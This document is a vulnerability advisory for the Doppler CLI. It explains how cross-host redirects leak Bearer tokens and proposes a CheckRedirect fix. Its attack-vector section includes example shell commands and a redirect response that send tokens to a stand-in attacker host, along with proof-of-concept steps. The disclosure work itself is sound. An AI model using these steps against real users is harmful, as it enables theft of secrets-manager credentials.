# Doppler CLI - HTTP Client Redirect Token Leakage

## Summary
The Doppler CLI's HTTP client follows HTTP redirects (3xx) without restricting cross-host redirects, preserving the `Authorization: Bearer` header across redirect boundaries. This allows an attacker who can control the API host (via environment variable, DNS hijack, or social engineering) to capture Doppler authentication tokens.

## Severity
**Medium** — Requires attacker-controlled API host or DNS compromise to exploit.

## Affected Component
- **Repository**: `DopplerHQ/cli`
- **File**: `pkg/http/http.go:164`
- **Affected Versions**: All versions (current and prior)

## Vulnerability Details

### Root Cause
The HTTP client is instantiated without a custom `CheckRedirect` function:

```go
// pkg/http/http.go:164
client := &http.Client{}
```

Go's default `http.Client` follows up to 10 redirects automatically, preserving all request headers including `Authorization: Bearer <token>`. There is no validation that redirect targets remain within the expected domain.

### Impact
If an attacker can redirect CLI API traffic to a server they control, they can capture:
- Doppler CLI authentication tokens (`dp.st.` service tokens)
- Personal access tokens (`dp.pt.`)
- Service account tokens (`dp.sa.`, `dp.said.`)

These tokens provide full API access to the victim's Doppler projects, configs, and secrets.

### Attack Vectors

**1. Environment Variable Poisoning (Local)**
```bash
# Attacker with local access sets:
export DOPPLER_API_HOST="http://attacker-server.com:9999"

# When victim runs any Doppler CLI command, tokens are sent to attacker
doppler secrets
```

**2. DNS Hijack/Takeover of api.doppler.com**
If `api.doppler.com` DNS is compromised, the attacker's server could respond with:
```
HTTP/1.1 302 Found
Location: http://attacker-controlled.com/api/v3/...
```
The CLI would follow the redirect and send the token to the attacker.

**3. Social Engineering via --api-host Flag**
An attacker could trick a user into running:
```bash
doppler secrets --api-host=http://attacker-server.com
```

### Proof of Concept

1. Start the PoC server (`reports/poc-doppler-redirect.go`)
2. Set `DOPPLER_API_HOST=http://127.0.0.1:9999`
3. Run `doppler secrets` with any valid token
4. The server captures the Authorization header

### Code Path
1. CLI generates URL using configured `api-host` (`pkg/configuration/config.go:220`)
2. Request sent with `Authorization: Bearer <token>` header (`pkg/http/api.go:44`)
3. HTTP client follows redirects without validation (`pkg/http/http.go:164`)
4. Token leaked to redirect target

## Recommendation
Add a `CheckRedirect` function that validates redirect targets remain within the same host:

```go
client := &http.Client{
    CheckRedirect: func(req *http.Request, via []*http.Request) error {
        if len(via) > 0 && req.URL.Host != via[0].URL.Host {
            return fmt.Errorf("redirect to different host blocked: %s", req.URL.Host)
        }
        return nil
    },
}
```

Alternatively, restrict redirects to the same scheme+host as the original request.

## Additional Note: Install Script Execution
The CLI also downloads and executes `https://cli.doppler.com/install.sh` (`pkg/http/github.go:73-84`) without cryptographic signature verification. While TLS is enforced, this could be exploited if the domain is compromised.

## References
- `pkg/http/http.go:164` — Client instantiation without CheckRedirect
- `pkg/http/api.go:44` — Bearer token header construction
- `pkg/cmd/root.go:184` — api-host flag definition
- `pkg/models/config.go:157` — DOPPLER_API_HOST environment variable mapping
- Go documentation: https://pkg.go.dev/net/http#Client.CheckRedirect
